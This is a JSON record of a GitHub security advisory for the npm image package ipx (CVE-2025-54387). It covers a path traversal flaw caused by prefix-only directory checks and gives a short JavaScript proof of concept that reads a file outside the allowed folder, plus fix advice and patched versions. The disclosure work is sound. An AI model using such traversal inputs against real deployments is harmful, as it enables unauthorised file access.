{
  "Severity": "MODERATE",
  "UpdatedAt": "2025-08-04T14:48:27Z",
  "Package": {
    "Ecosystem": "NPM",
    "Name": "ipx"
  },
  "Advisory": {
    "DatabaseId": 306172,
    "Id": "GSA_kwCzR0hTQS1tbTNwLWozNjgtN2pjcs4ABKv8",
    "GhsaId": "GHSA-mm3p-j368-7jcr",
    "References": [
      {
        "Url": "https://github.com/unjs/ipx/security/advisories/GHSA-mm3p-j368-7jcr"
      },
      {
        "Url": "https://github.com/unjs/ipx/commit/81693ddbfc062cc922e4e2406e8427ab4e3ad214"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-54387"
      },
      {
        "Url": "https://github.com/unjs/ipx/releases/tag/v1.3.2"
      },
      {
        "Url": "https://github.com/unjs/ipx/releases/tag/v2.1.1"
      },
      {
        "Url": "https://github.com/unjs/ipx/releases/tag/v3.1.1"
      },
      {
        "Url": "https://github.com/advisories/GHSA-mm3p-j368-7jcr"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-mm3p-j368-7jcr"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-54387"
      }
    ],
    "Description": "### Summary\n\nThe approach used to check whether a path is within allowed directories is vulnerable to path prefix bypass when the allowed directories do not end with a path separator. This occurs because the check relies on a raw string prefix comparison.\n\n\n### PoC\n\n- setup\n```\nmkdir ~/public123\nmove a png file under ~/public123 with name test.png\ncd\nnpm i ipx \n```\n\n- `main.js`\n```js\nimport { createIPX, ipxFSStorage } from \"ipx\";\n\nconst ipx = createIPX({\n  storage: ipxFSStorage({ dir: \"./public\" }),\n});\n\n\n(async () =\u003e { \n    {\n        const source = await ipx(\"../public123/test.png\"); // access file outside ./public dir because of same prefix folder\n        const { data, format } = await source.process();\n        console.log(format) // print image data\n    }\n    {\n        try {\n            const source = await ipx(\"../publi123/test.png\"); // forbidden path: the prefix is not the same\n            const { data, format } = await source.process();\n            console.log(data)\n        } catch (err) {\n            console.log(err.message) // Forbidden path:\n        }\n\n    }\n\n})()\n```\n\n- `node main.js`\n```\npng\nForbidden path: /../publi123/test.png\n```\n\n### Impact\nPath Traversal\n\n### Possible Fix\n\nCheck if the `dir` ends with `/` (path separator) and if not, add before calling `startsWith`",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-08-04T14:48:25Z",
    "Severity": "MODERATE",
    "Summary": "IPX Allows Path Traversal via Prefix Matching Bypass",
    "UpdatedAt": "2025-08-05T17:10:14Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 0,
      "VectorString": ""
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "3.1.1"
      },
      "VulnerableVersionRange": "\u003e= 3.0.0, \u003c 3.1.1"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "2.1.1"
      },
      "VulnerableVersionRange": "\u003e= 2.0.0-0, \u003c 2.1.1"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "1.3.2"
      },
      "VulnerableVersionRange": "\u003c 1.3.2"
    }
  ]
}